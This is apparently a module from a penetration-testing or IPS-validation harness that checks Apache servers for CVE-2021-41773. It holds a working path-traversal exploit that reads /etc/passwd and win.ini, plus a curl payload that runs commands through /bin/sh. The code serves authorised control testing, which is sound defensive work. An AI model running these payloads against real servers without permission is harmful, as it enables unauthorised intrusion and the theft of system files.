"""CVE-2021-41773 — Apache path traversal (mod_cgi normalize-path bug).
Direct HTTP check (curl): request /cgi-bin/.%2e/.. x7 to escape docroot and read
a sensitive file. Tries BOTH a Linux target (/etc/passwd) and a Windows target
(/windows/win.ini) — the vulnerable file differs by OS, and the lab's Apache
container is Linux, so a win.ini-only check 404s against its own lab."""
META = {
    "id": "apache_41773",
    "name": "Apache Path Traversal (CVE-2021-41773)",
    "category": "Server Exploitation",
    "test_type": "pentest",
    "control": "IPS signature / path normalization",
    "fix": "SD-WAN",
    "cve": "CVE-2021-41773",
    "mitre": ['T1190'],
    "cwe": ['CWE-22'],
    "tactic": 'Initial Access',
    "requires": ["curl"],
    "ports": [("tcp", 80)],
    "port_customizable": True,
    # Linux: /etc/passwd ("root:...:0:0:"); Windows: win.ini ("[fonts]"/"[extensions]")
    "success_regex": r"root:[^:]*:0:0:|\[fonts\]|\[extensions\]",
    # An inline IPS/WAF (e.g. Sangfor's "web Vulnerability" signature) blocks the
    # traversal by RESETTING the connection or returning a block page — curl then
    # reports a reset / empty reply / recv failure, NOT the file. Catch those (and
    # 403/406) so an IPS-blocked run scores BLOCKED instead of NO-RESULT. success
    # is still checked first, so a variant that bypasses and reads the file wins.
    "blocked_regex": (
        r"timed out|Connection refused|could not resolve|"
        r"Connection reset|reset by peer|Empty reply from server|Recv failure|"
        r"403 Forbidden|406 Not Acceptable|curl: \((52|56|104)\)"
    ),
}

_ESCAPE = "/cgi-bin/" + "/".join([".%2e"] * 7)
# File-READ variant (works when cgi-bin is a plain readable Alias, or on Windows).
_READ = [("Linux /etc/passwd", _ESCAPE + "/etc/passwd"),
         ("Windows win.ini", _ESCAPE + "/windows/win.ini")]


def run(target, ctx):
    # -v alongside -s: keep progress silent but re-enable connection diagnostics
    # so a closed/refused port surfaces "Connection refused" (blocked_regex)
    # instead of empty output.
    port = ctx.get_port("apache_41773", 80)   # overridable per-attack (GUI/env)
    out = []

    # RCE variant FIRST: when cgi-bin is a ScriptAlias + mod_cgi (the common 41773
    # setup, incl. this lab's container), the traversal EXECUTES the target — so a
    # file read via the alias returns 500 (exec attempt), not content. The canonical
    # confirmation is to traverse to /bin/sh and run `cat /etc/passwd`. Benign read,
    # but it IS code-exec: gated behind the harness RoE like every module.
    out.append("--- traversal -> RCE (cgi-bin ScriptAlias): cat /etc/passwd ---")
    # -S alongside -s: a silent run still surfaces the error line (e.g. an IPS
    # connection reset) instead of empty output that would read as NO-RESULT.
    out.append(ctx.run_cmd(
        f'curl -s -S --path-as-is -m10 -d "echo Content-Type: text/plain; echo; cat /etc/passwd" '
        f'"http://{{target}}:{port}{_ESCAPE}/bin/sh"', target))

    # File-READ fallback (plain readable Alias / Windows target)
    for label, path in _READ:
        out.append(f"--- traversal -> read {label} ---")
        out.append(ctx.run_cmd(
            f'curl -s -v --path-as-is -m10 "http://{{target}}:{port}{path}"', target))
    return "\n".join(out)
